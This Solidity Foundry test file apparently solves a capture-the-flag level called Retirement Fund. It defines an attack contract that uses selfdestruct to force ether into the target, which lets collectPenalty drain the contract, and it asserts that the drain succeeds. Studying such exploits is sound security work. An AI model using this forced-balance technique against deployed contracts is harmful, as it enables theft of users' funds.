// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/math/RetirementFund.sol";
import "forge-std/console.sol";

// forge test --match-contract RetirementFundTest -vvvv
contract RetirementFundTest is Test {
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testRetirementFundHack() public {
        /****************
         * Factory setup *
         *************** */
        RetirementFundChallenge retirementFund = new RetirementFundChallenge{
            value: 1 ether
        }(player);
        vm.startPrank(player);
        address payable levelAddress = payable(address(retirementFund));
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        /*
         * Goal: retire the total amount without penalty
         * In order to do so we can create a malicious contracat that will call
         * selfdestruct on creation of the contract
         * Then, we can simply call collectPenalty and we would have drained the contract balance;
         */

        uint256 initialRetirementBalance = address(retirementFund).balance;
        // Create the hack contract
        new RetirementFundHack{value: 1 ether}(levelAddress);
        uint256 intermediaryRetirementBalance = address(retirementFund).balance;
        retirementFund.collectPenalty();
        uint256 finalRetirementBalance = address(retirementFund).balance;
        assertEq(initialRetirementBalance, 1 ether);
        // 2 ether because the contract received the 1ether from selfdestruct
        assertEq(intermediaryRetirementBalance, 2 ether);
        assertEq(finalRetirementBalance, 0);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = retirementFund.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }

    fallback() external payable {}

    receive() external payable {}
}

contract RetirementFundHack {
    constructor(address _address) public payable {
        require(msg.value > 0);
        selfdestruct(payable(_address));
    }
}
